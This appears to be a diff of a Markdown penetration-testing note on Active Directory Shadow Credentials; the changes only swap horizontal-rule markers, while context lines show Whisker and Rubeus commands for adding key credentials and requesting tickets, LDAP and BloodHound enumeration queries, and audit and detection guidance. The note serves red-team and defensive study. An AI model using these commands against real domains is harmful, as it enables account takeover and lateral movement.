@@ -17,7 +17,7 @@ linked:
 ---
 # AD - Delegation Enumeration - Shadow Credentials
 
-***
+---
 
 ## Concept Overview
 
@@ -30,7 +30,7 @@ linked:
 | Min OS | Server 2016+ schema (NgC support) | Compatibility. |
 ^ad-shadowcred-concept
 
-___
+---
 
 ## msDS-KeyCredentialLink Attribute
 
@@ -43,7 +43,7 @@ ___
 | `nxc ldap <DC> -u u -p p --query "(msDS-KeyCredentialLink=*)" "samAccountName,msDS-KeyCredentialLink"` | netexec | Quick. |
 ^ad-shadowcred-attr
 
-___
+---
 
 ## Shadow Credentials Attack Chain
 
@@ -80,7 +80,7 @@ Whisker.exe add /target:victim /domain:corp.local /dc:dc01.corp.local
 Rubeus.exe asktgt /user:victim /certificate:<base64-PFX> /password:<pwd> /domain:corp.local /dc:dc01 /ptt
 ```
 
-___
+---
 
 ## ACL Required
 
@@ -102,7 +102,7 @@ Find-InterestingDomainAcl -ResolveGUIDs |
   Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
 ```
 
-___
+---
 
 ## BloodHound AddKeyCredentialLink Edge
 
@@ -113,7 +113,7 @@ ___
 | `MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) WHERE any(r IN relationships(p) WHERE type(r) = "AddKeyCredentialLink") RETURN p` | Mixed paths con Shadow Cred edge | Standard. |
 ^ad-shadowcred-bh
 
-___
+---
 
 ## Existing Shadow Credentials Audit
 
@@ -132,7 +132,7 @@ Get-ADUser -Filter * -Properties msDS-KeyCredentialLink,whenChanged |
   Select Name,SamAccountName,whenChanged
 ```
 
-___
+---
 
 ## Detection & Mitigations
 
@@ -145,7 +145,7 @@ ___
 | Audit cert authority logs (issued certs) | Cross-correlate suspicious enrollments | SIEM. |
 ^ad-shadowcred-detection
 
-___
+---
 
 ## Modern: NgC = Windows Hello
 
@@ -159,4 +159,4 @@ ___
 
 **Audit caveat:** entornos con WHfB tienen KeyCred entries en **muchos users legítimos**. Hunt = filter por `whenChanged` reciente + cross-ref con creator (Event 5136).
 
-***
+---
